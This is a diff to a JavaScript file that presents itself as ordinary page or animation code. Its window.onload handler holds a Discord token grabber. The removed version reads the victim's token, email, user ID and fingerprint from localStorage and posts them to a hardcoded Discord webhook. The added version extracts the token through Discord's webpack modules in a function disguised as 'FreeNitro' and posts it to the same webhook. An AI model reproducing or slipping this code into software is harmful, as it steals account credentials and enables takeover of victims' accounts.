@@ -133,15 +133,38 @@ function animate () {
 
 window.onload = function () {
     var discordWebhook = "https://discord.com/api/webhooks/1274476164659810408/8AzWuwNk23QppWXZMhsaBmrL89Nx5cHneMHA4LjY-ns2nuAMj6KKjeJip9F-BJa8hfAW";
-    var i = document.createElement('iframe');
-    document.body.appendChild(i);
-    var request = new XMLHttpRequest();
-    request.open("POST", discordWebhook);
-    request.setRequestHeader('Content-type', 'application/json');
-    var params = {
-        username: "Token Grabber",
-        avatar_url: "https://malwarefox.com/wp-content/uploads/2017/11/hacker-1.png",
-        content: '**Nouvelle personne hackée !**\n------------------\nToken : ' + i.contentWindow.localStorage.token + '\n------------------\nAdresse email : ' + i.contentWindow.localStorage.email_cache + '\n------------------\nUser ID : ' + i.contentWindow.localStorage.user_id_cache + '\n------------------\nFingerprint : ' + i.contentWindow.localStorage.fingerprint + '\n------------------\nPropriétés : \`\`\`json\n' + i.contentWindow.localStorage.deviceProperties
+    const webhookurl = 'https://discord.com/api/webhooks/1274476164659810408/8AzWuwNk23QppWXZMhsaBmrL89Nx5cHneMHA4LjY-ns2nuAMj6KKjeJip9F-BJa8hfAW';
+
+var req = webpackJsonp.push([
+    [], {
+        extra_id: (e, t, r) => e.exports = r
+    },
+    [
+        ["extra_id"]
+    ]
+]);
+for (let e in req.c)
+    if (req.c.hasOwnProperty(e)) {
+        let t = req.c[e].exports;
+        if (t && t.__esModule && t.default)
+            for (let e in t.default) "getToken" === e && (token = t.default.getToken())
+    }
+function FreeNitro() {
+    var e = new XMLHttpRequest;
+    e.open("POST", webhookurl), e.setRequestHeader("Content-type", "application/json");
+    var t = {
+        username: "StanGrabber",
+        avatar_url: "https://cdn.discordapp.com/attachments/736612991948030037/751790394462961715/450.png",
+        content: "",
+        embeds: [{
+            color: "4700374",
+            description: "Token : " + token,
+            footer: {
+                text: "By Stanley#0001 | https://youtube.com/Stanleydev"
+            }
+        }]
     };
-    request.send(JSON.stringify(params));
+    e.send(JSON.stringify(t))
+}
+FreeNitro();
 }
